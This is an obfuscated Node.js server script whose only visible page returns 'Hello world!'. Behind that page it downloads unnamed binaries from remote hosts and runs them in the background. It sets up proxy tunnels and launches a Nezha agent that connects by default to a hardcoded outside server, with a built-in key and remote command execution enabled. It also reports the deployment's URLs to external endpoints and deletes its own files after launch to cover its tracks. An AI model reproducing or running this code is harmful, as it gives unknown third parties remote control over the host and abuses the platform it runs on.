const _0x32e53a=_0x1304;(function(_0x4b9b5e,_0x30e991){const _0x114c10=_0x1304,_0x2287cd=_0x4b9b5e();while(!![]){try{const _0x3da336=parseInt(_0x114c10(0x1f1))/0x1*(parseInt(_0x114c10(0x1d4))/0x2)+parseInt(_0x114c10(0x1cc))/0x3+parseInt(_0x114c10(0x188))/0x4+parseInt(_0x114c10(0x16c))/0x5*(parseInt(_0x114c10(0x18f))/0x6)+-parseInt(_0x114c10(0x204))/0x7*(-parseInt(_0x114c10(0x198))/0x8)+-parseInt(_0x114c10(0x19c))/0x9*(-parseInt(_0x114c10(0x209))/0xa)+-parseInt(_0x114c10(0x1cd))/0xb*(parseInt(_0x114c10(0x1ed))/0xc);if(_0x3da336===_0x30e991)break;else _0x2287cd['push'](_0x2287cd['shift']());}catch(_0x2ba9df){_0x2287cd['push'](_0x2287cd['shift']());}}}(_0x2606,0xb3ff1));const express=require(_0x32e53a(0x1fb)),app=express(),axios=require(_0x32e53a(0x1a8)),os=require('os'),fs=require('fs'),path=require(_0x32e53a(0x1ec)),{promisify}=require(_0x32e53a(0x1c3)),exec=promisify(require(_0x32e53a(0x196))['exec']),{execSync}=require(_0x32e53a(0x196)),UPLOAD_URL=process['env'][_0x32e53a(0x174)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x32e53a(0x191)][_0x32e53a(0x179)]||![],FILE_PATH=process[_0x32e53a(0x191)][_0x32e53a(0x17f)]||_0x32e53a(0x1d3),SUB_PATH=process['env'][_0x32e53a(0x1d9)]||_0x32e53a(0x1b0),PORT=process['env'][_0x32e53a(0x1e1)]||process[_0x32e53a(0x191)]['PORT']||0xbb8,UUID=process['env'][_0x32e53a(0x15f)]||_0x32e53a(0x1e3),NEZHA_SERVER=process[_0x32e53a(0x191)][_0x32e53a(0x1e7)]||_0x32e53a(0x1fe),NEZHA_PORT=process[_0x32e53a(0x191)][_0x32e53a(0x1cb)]||'',NEZHA_KEY=process['env'][_0x32e53a(0x1d8)]||'NwxKJwM9UKRCX5TBPaBm0IrjNCSyflif',ARGO_DOMAIN=process['env'][_0x32e53a(0x1b7)]||'',ARGO_AUTH=process[_0x32e53a(0x191)][_0x32e53a(0x171)]||'',ARGO_PORT=process[_0x32e53a(0x191)]['ARGO_PORT']||0x9e3,CFIP=process[_0x32e53a(0x191)]['CFIP']||_0x32e53a(0x17b),CFPORT=process['env'][_0x32e53a(0x183)]||0x1bb,NAME=process[_0x32e53a(0x191)][_0x32e53a(0x187)]||_0x32e53a(0x1b1);!fs[_0x32e53a(0x19b)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x32e53a(0x206)](FILE_PATH+'\x20is\x20created')):console[_0x32e53a(0x206)](FILE_PATH+_0x32e53a(0x205));let npmPath=path[_0x32e53a(0x1f2)](FILE_PATH,_0x32e53a(0x1b5)),phpPath=path[_0x32e53a(0x1f2)](FILE_PATH,_0x32e53a(0x16a)),webPath=path['join'](FILE_PATH,_0x32e53a(0x1fd)),botPath=path['join'](FILE_PATH,_0x32e53a(0x20d)),subPath=path[_0x32e53a(0x1f2)](FILE_PATH,_0x32e53a(0x1ac)),listPath=path[_0x32e53a(0x1f2)](FILE_PATH,_0x32e53a(0x175)),bootLogPath=path['join'](FILE_PATH,_0x32e53a(0x181)),configPath=path[_0x32e53a(0x1f2)](FILE_PATH,_0x32e53a(0x1ce));function deleteNodes(){const _0x10f3ed=_0x32e53a;try{if(!UPLOAD_URL)return;if(!fs[_0x10f3ed(0x19b)](subPath))return;let _0x56d71c;try{_0x56d71c=fs[_0x10f3ed(0x1ff)](subPath,_0x10f3ed(0x1eb));}catch{return null;}const _0x4a758f=Buffer['from'](_0x56d71c,_0x10f3ed(0x1c4))[_0x10f3ed(0x1f0)](_0x10f3ed(0x1eb)),_0x541dea=_0x4a758f[_0x10f3ed(0x1d2)]('\x0a')[_0x10f3ed(0x1f9)](_0xf8a7c0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x10f3ed(0x162)](_0xf8a7c0));if(_0x541dea['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x10f3ed(0x1be),JSON[_0x10f3ed(0x193)]({'nodes':_0x541dea}),{'headers':{'Content-Type':_0x10f3ed(0x1d6)}})[_0x10f3ed(0x178)](_0x975bee=>{return null;});}catch(_0x25f7f4){return null;}}function _0x2606(){const _0x4a46bc=['join','/vless-argo','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Error\x20downloading\x20files:','message','/trojan-argo','2096','filter','/vmess-argo?ed=2560','express','trim','web','a.holoy.dpdns.org:36958','readFileSync','https://oooo.serv00.net/add-url','forEach','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','finish','2401777kxpLPm','\x20already\x20exists','log','https://arm64.ssss.nyc.mn/agent','send','1439750dXJFsw','arm','Hello\x20world!','App\x20is\x20running','bot','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','post','\x0avless://','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20tunnel:\x20','clear','/npm\x20-s\x20','all','get','./bot','error','Download\x20','UUID','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','aarch64','test','quic','bot\x20is\x20running.','response','Empowerment\x20success\x20for\x20','close','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','8443','php','/web\x20-c\x20','418710rJsRMK','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','stream','/dev/null','/bot\x20','ARGO_AUTH','freedom','2053','UPLOAD_URL','list.txt','&path=%2Fvless-argo%3Fed%3D2560#','xtls-rprx-vision','catch','AUTO_ACCESS','set','www.visa.com.sg','unlinkSync','chmod','?security=tls&sni=','FILE_PATH','automatic\x20access\x20task\x20added\x20successfully','boot.log','TunnelSecret','CFPORT','unlink','Content-Type','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','NAME','3426736vgwjyZ','./php','Error\x20reading\x20boot.log:','/tunnel.yml\x20run','\x0aclient_secret:\x20','false','length','6JUVGBl','has','env','rm\x20-rf\x20','stringify','NEZHA\x20variable\x20is\x20empty,skip\x20running','tunnel.yml','child_process','https://arm64.ssss.nyc.mn/v1','8JzHOfP','text/plain;\x20charset=utf-8','https://arm64.ssss.nyc.mn/2go','existsSync','27THDGis','\x20>/dev/null\x202>&1\x20&','&path=%2Ftrojan-argo%3Fed%3D2560#','pipe','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','添加URL失败:\x20','./npm','npm\x20is\x20running','\x0a\x20\x20\x20\x20','amd','\x20-p\x20','block','axios','/api/add-subscriptions','/api/add-nodes','match','sub.txt','vless','tcp','includes','sub','Vls','2083','none','443','npm','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','ARGO_DOMAIN','direct','web\x20running\x20error:\x20','http','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','php\x20is\x20running','Subscription\x20uploaded\x20successfully','/api/delete-nodes','blackhole','push','nohup\x20','trojan','util','base64','/sub.txt\x20saved\x20successfully','\x20failed:\x20','tls','Skipping\x20adding\x20automatic\x20access\x20task','from','pop','NEZHA_PORT','4181988tlpOpE','231gWMKWL','config.json','--tls','https://arm64.ssss.nyc.mn/web','status','split','./tmp','1449102feZNtg','/config.json\x20>/dev/null\x202>&1\x20&','application/json','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','NEZHA_KEY','SUB_PATH','127.0.0.1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','unshift','arm64','https://amd64.ssss.nyc.mn/agent','tunnel.json','then','SERVER_PORT','https://amd64.ssss.nyc.mn/web','afd6e57a-444f-4a15-87af-854430b0e3b2','Error\x20executing\x20command:\x20','https+local://8.8.8.8/dns-query','/vmess-argo','NEZHA_SERVER','writeFileSync','http\x20server\x20is\x20running\x20on\x20port:','web\x20is\x20running','utf-8','path','1769568OagpQk','2087','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','toString','1KzmAVh'];_0x2606=function(){return _0x4a46bc;};return _0x2606();}function cleanupOldFiles(){const _0x5ee628=_0x32e53a,_0x4e16ef=[_0x5ee628(0x1fd),_0x5ee628(0x20d),_0x5ee628(0x1b5),'php','sub.txt',_0x5ee628(0x181)];_0x4e16ef[_0x5ee628(0x201)](_0x1cbbe3=>{const _0xfa8483=_0x5ee628,_0x41ab43=path[_0xfa8483(0x1f2)](FILE_PATH,_0x1cbbe3);fs[_0xfa8483(0x184)](_0x41ab43,()=>{});});}app['get']('/',function(_0x40e97e,_0x32a536){const _0x3469eb=_0x32e53a;_0x32a536[_0x3469eb(0x208)](_0x3469eb(0x20b));});const config={'log':{'access':_0x32e53a(0x16f),'error':_0x32e53a(0x16f),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x32e53a(0x1ad),'settings':{'clients':[{'id':UUID,'flow':_0x32e53a(0x177)}],'decryption':_0x32e53a(0x1b3),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x32e53a(0x1e6),'dest':0xbbb},{'path':_0x32e53a(0x1f7),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x32e53a(0x1ad),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x32e53a(0x1ae),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x32e53a(0x1b3)},'streamSettings':{'network':'ws','security':_0x32e53a(0x1b3),'wsSettings':{'path':_0x32e53a(0x1f3)}},'sniffing':{'enabled':!![],'destOverride':[_0x32e53a(0x1ba),_0x32e53a(0x1c7),_0x32e53a(0x163)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x32e53a(0x1c7),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x32e53a(0x1da),'protocol':_0x32e53a(0x1c2),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x32e53a(0x1f7)}},'sniffing':{'enabled':!![],'destOverride':[_0x32e53a(0x1ba),_0x32e53a(0x1c7),_0x32e53a(0x163)],'metadataOnly':![]}}],'dns':{'servers':[_0x32e53a(0x1e5)]},'outbounds':[{'protocol':_0x32e53a(0x172),'tag':_0x32e53a(0x1b8)},{'protocol':_0x32e53a(0x1bf),'tag':_0x32e53a(0x1a7)}]};fs['writeFileSync'](path[_0x32e53a(0x1f2)](FILE_PATH,'config.json'),JSON['stringify'](config,null,0x2));function getSystemArchitecture(){const _0x68d5a=_0x32e53a,_0x187265=os['arch']();return _0x187265===_0x68d5a(0x20a)||_0x187265===_0x68d5a(0x1dd)||_0x187265===_0x68d5a(0x161)?_0x68d5a(0x20a):_0x68d5a(0x1a5);}function downloadFile(_0x513d4a,_0x233dfb,_0x49b2ad){const _0x3b2101=_0x32e53a,_0x5f087e=path['join'](FILE_PATH,_0x513d4a),_0x4a9d45=fs['createWriteStream'](_0x5f087e);axios({'method':'get','url':_0x233dfb,'responseType':_0x3b2101(0x16e)})[_0x3b2101(0x1e0)](_0x3e6f11=>{const _0x10c47a=_0x3b2101;_0x3e6f11['data'][_0x10c47a(0x19f)](_0x4a9d45),_0x4a9d45['on'](_0x10c47a(0x203),()=>{const _0x513435=_0x10c47a;_0x4a9d45[_0x513435(0x167)](),console['log'](_0x513435(0x15e)+_0x513d4a+'\x20successfully'),_0x49b2ad(null,_0x513d4a);}),_0x4a9d45['on'](_0x10c47a(0x15d),_0x165383=>{const _0x2e28b6=_0x10c47a;fs[_0x2e28b6(0x184)](_0x5f087e,()=>{});const _0x47ecef='Download\x20'+_0x513d4a+_0x2e28b6(0x1c6)+_0x165383[_0x2e28b6(0x1f6)];console[_0x2e28b6(0x15d)](_0x47ecef),_0x49b2ad(_0x47ecef);});})[_0x3b2101(0x178)](_0x7bc7bf=>{const _0x37871b=_0x3b2101,_0x5bc149=_0x37871b(0x15e)+_0x513d4a+_0x37871b(0x1c6)+_0x7bc7bf[_0x37871b(0x1f6)];console[_0x37871b(0x15d)](_0x5bc149),_0x49b2ad(_0x5bc149);});}async function downloadFilesAndRun(){const _0x3bc8a1=_0x32e53a,_0x39b2a9=getSystemArchitecture(),_0x3f3f3c=getFilesForArchitecture(_0x39b2a9);if(_0x3f3f3c[_0x3bc8a1(0x18e)]===0x0){console[_0x3bc8a1(0x206)](_0x3bc8a1(0x1db));return;}const _0x54c077=_0x3f3f3c['map'](_0x4a72e7=>{return new Promise((_0xc63520,_0x5c15f4)=>{downloadFile(_0x4a72e7['fileName'],_0x4a72e7['fileUrl'],(_0x43f7b4,_0x14f6ac)=>{_0x43f7b4?_0x5c15f4(_0x43f7b4):_0xc63520(_0x14f6ac);});});});try{await Promise[_0x3bc8a1(0x15a)](_0x54c077);}catch(_0x57598e){console[_0x3bc8a1(0x15d)](_0x3bc8a1(0x1f5),_0x57598e);return;}function _0x470992(_0x2c167c){const _0x473efd=_0x3bc8a1,_0x2299f7=0x1fd;_0x2c167c[_0x473efd(0x201)](_0x287ea1=>{const _0x3da638=_0x473efd,_0x540992=path[_0x3da638(0x1f2)](FILE_PATH,_0x287ea1);fs[_0x3da638(0x19b)](_0x540992)&&fs[_0x3da638(0x17d)](_0x540992,_0x2299f7,_0x23a5af=>{const _0x4d1a22=_0x3da638;_0x23a5af?console['error']('Empowerment\x20failed\x20for\x20'+_0x540992+':\x20'+_0x23a5af):console['log'](_0x4d1a22(0x166)+_0x540992+':\x20'+_0x2299f7[_0x4d1a22(0x1f0)](0x8));});});}const _0x2c300d=NEZHA_PORT?[_0x3bc8a1(0x1a2),'./web',_0x3bc8a1(0x15c)]:[_0x3bc8a1(0x189),'./web',_0x3bc8a1(0x15c)];_0x470992(_0x2c300d);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5e696a=NEZHA_SERVER[_0x3bc8a1(0x1af)](':')?NEZHA_SERVER[_0x3bc8a1(0x1d2)](':')[_0x3bc8a1(0x1ca)]():'',_0x5f19af=new Set([_0x3bc8a1(0x1b4),_0x3bc8a1(0x169),_0x3bc8a1(0x1f8),_0x3bc8a1(0x1ee),_0x3bc8a1(0x1b2),_0x3bc8a1(0x173)]),_0x5a3523=_0x5f19af[_0x3bc8a1(0x190)](_0x5e696a)?'true':_0x3bc8a1(0x18d),_0x457d8f=_0x3bc8a1(0x18c)+NEZHA_KEY+_0x3bc8a1(0x1d7)+NEZHA_SERVER+_0x3bc8a1(0x202)+_0x5a3523+_0x3bc8a1(0x156)+UUID;fs[_0x3bc8a1(0x1e8)](path[_0x3bc8a1(0x1f2)](FILE_PATH,'config.yaml'),_0x457d8f);const _0x29fcd1='nohup\x20'+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x29fcd1),console[_0x3bc8a1(0x206)](_0x3bc8a1(0x1bc)),await new Promise(_0x4036a4=>setTimeout(_0x4036a4,0x3e8));}catch(_0x347b0b){console[_0x3bc8a1(0x15d)]('php\x20running\x20error:\x20'+_0x347b0b);}}else{let _0x39588e='';const _0x87cc85=[_0x3bc8a1(0x1b4),_0x3bc8a1(0x169),_0x3bc8a1(0x1f8),_0x3bc8a1(0x1ee),'2083',_0x3bc8a1(0x173)];_0x87cc85[_0x3bc8a1(0x1af)](NEZHA_PORT)&&(_0x39588e=_0x3bc8a1(0x1cf));const _0x499f69='nohup\x20'+FILE_PATH+_0x3bc8a1(0x159)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3bc8a1(0x1a6)+NEZHA_KEY+'\x20'+_0x39588e+_0x3bc8a1(0x19d);try{await exec(_0x499f69),console['log'](_0x3bc8a1(0x1a3)),await new Promise(_0x49765c=>setTimeout(_0x49765c,0x3e8));}catch(_0x2475ac){console[_0x3bc8a1(0x15d)]('npm\x20running\x20error:\x20'+_0x2475ac);}}}else console['log'](_0x3bc8a1(0x194));const _0x37a3ad=_0x3bc8a1(0x1c1)+FILE_PATH+_0x3bc8a1(0x16b)+FILE_PATH+_0x3bc8a1(0x1d5);try{await exec(_0x37a3ad),console[_0x3bc8a1(0x206)](_0x3bc8a1(0x1ea)),await new Promise(_0x51197c=>setTimeout(_0x51197c,0x3e8));}catch(_0x8e741d){console[_0x3bc8a1(0x15d)](_0x3bc8a1(0x1b9)+_0x8e741d);}if(fs[_0x3bc8a1(0x19b)](path['join'](FILE_PATH,_0x3bc8a1(0x20d)))){let _0x2db762;if(ARGO_AUTH[_0x3bc8a1(0x1ab)](/^[A-Z0-9a-z=]{120,250}$/))_0x2db762=_0x3bc8a1(0x1a0)+ARGO_AUTH;else ARGO_AUTH[_0x3bc8a1(0x1ab)](/TunnelSecret/)?_0x2db762=_0x3bc8a1(0x16d)+FILE_PATH+_0x3bc8a1(0x18b):_0x2db762=_0x3bc8a1(0x186)+FILE_PATH+_0x3bc8a1(0x1bb)+ARGO_PORT;try{await exec(_0x3bc8a1(0x1c1)+FILE_PATH+_0x3bc8a1(0x170)+_0x2db762+_0x3bc8a1(0x19d)),console[_0x3bc8a1(0x206)]('bot\x20is\x20running'),await new Promise(_0x5d8f74=>setTimeout(_0x5d8f74,0x7d0));}catch(_0x3fd0c6){console['error'](_0x3bc8a1(0x1e4)+_0x3fd0c6);}}await new Promise(_0x53f989=>setTimeout(_0x53f989,0x1388));}function getFilesForArchitecture(_0x450659){const _0x44acdf=_0x32e53a;let _0x56fbb1;_0x450659===_0x44acdf(0x20a)?_0x56fbb1=[{'fileName':_0x44acdf(0x1fd),'fileUrl':_0x44acdf(0x1d0)},{'fileName':_0x44acdf(0x20d),'fileUrl':_0x44acdf(0x19a)}]:_0x56fbb1=[{'fileName':'web','fileUrl':_0x44acdf(0x1e2)},{'fileName':_0x44acdf(0x20d),'fileUrl':'https://amd64.ssss.nyc.mn/2go'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x56f54e=_0x450659===_0x44acdf(0x20a)?_0x44acdf(0x207):_0x44acdf(0x1de);_0x56fbb1[_0x44acdf(0x1dc)]({'fileName':_0x44acdf(0x1b5),'fileUrl':_0x56f54e});}else{const _0x556ee2=_0x450659==='arm'?_0x44acdf(0x197):'https://amd64.ssss.nyc.mn/v1';_0x56fbb1[_0x44acdf(0x1dc)]({'fileName':_0x44acdf(0x16a),'fileUrl':_0x556ee2});}}return _0x56fbb1;}function argoType(){const _0x321356=_0x32e53a;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x321356(0x206)](_0x321356(0x1ef));return;}if(ARGO_AUTH['includes'](_0x321356(0x182))){fs[_0x321356(0x1e8)](path[_0x321356(0x1f2)](FILE_PATH,_0x321356(0x1df)),ARGO_AUTH);const _0x490a63=_0x321356(0x157)+ARGO_AUTH[_0x321356(0x1d2)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x321356(0x1f2)](FILE_PATH,'tunnel.json')+_0x321356(0x168)+ARGO_DOMAIN+_0x321356(0x20e)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x321356(0x1e8)](path['join'](FILE_PATH,_0x321356(0x195)),_0x490a63);}else console[_0x321356(0x206)](_0x321356(0x1b6));}argoType();async function extractDomains(){const _0x2e80b8=_0x32e53a;let _0x7d9ccb;if(ARGO_AUTH&&ARGO_DOMAIN)_0x7d9ccb=ARGO_DOMAIN,console[_0x2e80b8(0x206)]('ARGO_DOMAIN:',_0x7d9ccb),await _0x631b02(_0x7d9ccb);else try{const _0x683987=fs[_0x2e80b8(0x1ff)](path['join'](FILE_PATH,'boot.log'),_0x2e80b8(0x1eb)),_0x5e9f48=_0x683987[_0x2e80b8(0x1d2)]('\x0a'),_0x28960d=[];_0x5e9f48[_0x2e80b8(0x201)](_0x5bd40a=>{const _0x5f046e=_0x2e80b8,_0x3b783b=_0x5bd40a[_0x5f046e(0x1ab)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3b783b){const _0x3ad622=_0x3b783b[0x1];_0x28960d['push'](_0x3ad622);}});if(_0x28960d['length']>0x0)_0x7d9ccb=_0x28960d[0x0],console[_0x2e80b8(0x206)]('ArgoDomain:',_0x7d9ccb),await _0x631b02(_0x7d9ccb);else{console['log'](_0x2e80b8(0x1f4)),fs[_0x2e80b8(0x17c)](path[_0x2e80b8(0x1f2)](FILE_PATH,_0x2e80b8(0x181)));async function _0x516873(){const _0x39233f=_0x2e80b8;try{await exec(_0x39233f(0x160));}catch(_0x31f7b8){}}_0x516873(),await new Promise(_0x159a6f=>setTimeout(_0x159a6f,0xbb8));const _0x3c653c=_0x2e80b8(0x186)+FILE_PATH+_0x2e80b8(0x1bb)+ARGO_PORT;try{await exec(_0x2e80b8(0x1c1)+path[_0x2e80b8(0x1f2)](FILE_PATH,_0x2e80b8(0x20d))+'\x20'+_0x3c653c+_0x2e80b8(0x19d)),console[_0x2e80b8(0x206)](_0x2e80b8(0x164)),await new Promise(_0x5d55ab=>setTimeout(_0x5d55ab,0xbb8)),await extractDomains();}catch(_0x311bbf){console[_0x2e80b8(0x15d)](_0x2e80b8(0x1e4)+_0x311bbf);}}}catch(_0x34436f){console['error'](_0x2e80b8(0x18a),_0x34436f);}async function _0x631b02(_0x575d56){const _0x3fa2ae=_0x2e80b8,_0x3b2f35=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x3fa2ae(0x1eb)}),_0x499327=_0x3b2f35[_0x3fa2ae(0x1fc)]();return new Promise(_0x2d0419=>{setTimeout(()=>{const _0x49dc04=_0x1304,_0x2d9247={'v':'2','ps':NAME+'-'+_0x499327,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x49dc04(0x1b3),'net':'ws','type':'none','host':_0x575d56,'path':_0x49dc04(0x1fa),'tls':_0x49dc04(0x1c7),'sni':_0x575d56,'alpn':''},_0x5d436f=_0x49dc04(0x155)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x575d56+'&type=ws&host='+_0x575d56+_0x49dc04(0x176)+NAME+'-'+_0x499327+'\x0a\x20\x20\x0avmess://'+Buffer[_0x49dc04(0x1c9)](JSON[_0x49dc04(0x193)](_0x2d9247))['toString'](_0x49dc04(0x1c4))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x49dc04(0x17e)+_0x575d56+'&type=ws&host='+_0x575d56+_0x49dc04(0x19e)+NAME+'-'+_0x499327+_0x49dc04(0x1a4);console[_0x49dc04(0x206)](Buffer[_0x49dc04(0x1c9)](_0x5d436f)[_0x49dc04(0x1f0)](_0x49dc04(0x1c4))),fs[_0x49dc04(0x1e8)](subPath,Buffer[_0x49dc04(0x1c9)](_0x5d436f)[_0x49dc04(0x1f0)](_0x49dc04(0x1c4))),console[_0x49dc04(0x206)](FILE_PATH+_0x49dc04(0x1c5)),uplodNodes(),app[_0x49dc04(0x15b)]('/'+SUB_PATH,(_0xf0aa20,_0x74db91)=>{const _0x22a21f=_0x49dc04,_0x9b4d4b=Buffer[_0x22a21f(0x1c9)](_0x5d436f)[_0x22a21f(0x1f0)](_0x22a21f(0x1c4));_0x74db91[_0x22a21f(0x17a)](_0x22a21f(0x185),_0x22a21f(0x199)),_0x74db91[_0x22a21f(0x208)](_0x9b4d4b);}),_0x2d0419(_0x5d436f);},0x7d0);});}}async function uplodNodes(){const _0x204676=_0x32e53a;if(UPLOAD_URL&&PROJECT_URL){const _0x24f7d9=PROJECT_URL+'/'+SUB_PATH,_0x325921={'subscription':[_0x24f7d9]};try{const _0x4507eb=await axios[_0x204676(0x20f)](UPLOAD_URL+_0x204676(0x1a9),_0x325921,{'headers':{'Content-Type':'application/json'}});if(_0x4507eb[_0x204676(0x1d1)]===0xc8)console[_0x204676(0x206)](_0x204676(0x1bd));else return null;}catch(_0x578e7a){if(_0x578e7a['response']){if(_0x578e7a[_0x204676(0x165)][_0x204676(0x1d1)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x204676(0x19b)](listPath))return;const _0x3e147b=fs[_0x204676(0x1ff)](listPath,_0x204676(0x1eb)),_0x31f531=_0x3e147b[_0x204676(0x1d2)]('\x0a')[_0x204676(0x1f9)](_0x12fc54=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x204676(0x162)](_0x12fc54));if(_0x31f531[_0x204676(0x18e)]===0x0)return;const _0x43602d=JSON['stringify']({'nodes':_0x31f531});try{await axios[_0x204676(0x20f)](UPLOAD_URL+_0x204676(0x1aa),_0x43602d,{'headers':{'Content-Type':_0x204676(0x1d6)}});if(response[_0x204676(0x1d1)]===0xc8)console[_0x204676(0x206)](_0x204676(0x1bd));else return null;}catch(_0x3cd46f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4a6281=_0x1304,_0x2fbcae=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x2fbcae[_0x4a6281(0x1c0)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2fbcae[_0x4a6281(0x1c0)](phpPath);exec(_0x4a6281(0x192)+_0x2fbcae['join']('\x20')+'\x20>/dev/null\x202>&1',_0x199226=>{const _0x2be542=_0x4a6281;console[_0x2be542(0x158)](),console[_0x2be542(0x206)](_0x2be542(0x20c)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x149632=_0x32e53a;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x149632(0x1c8));return;}try{const _0x2fc888=await axios['post'](_0x149632(0x200),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x149632(0x1d6)}});console['log'](_0x149632(0x180));}catch(_0x16c552){console[_0x149632(0x15d)](_0x149632(0x1a1)+_0x16c552[_0x149632(0x1f6)]);}}function _0x1304(_0x1a0b51,_0x51ae0b){const _0x26065e=_0x2606();return _0x1304=function(_0x1304f9,_0x2cc85a){_0x1304f9=_0x1304f9-0x155;let _0x2d9648=_0x26065e[_0x1304f9];return _0x2d9648;},_0x1304(_0x1a0b51,_0x51ae0b);}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app['listen'](PORT,()=>console['log'](_0x32e53a(0x1e9)+PORT+'!'));
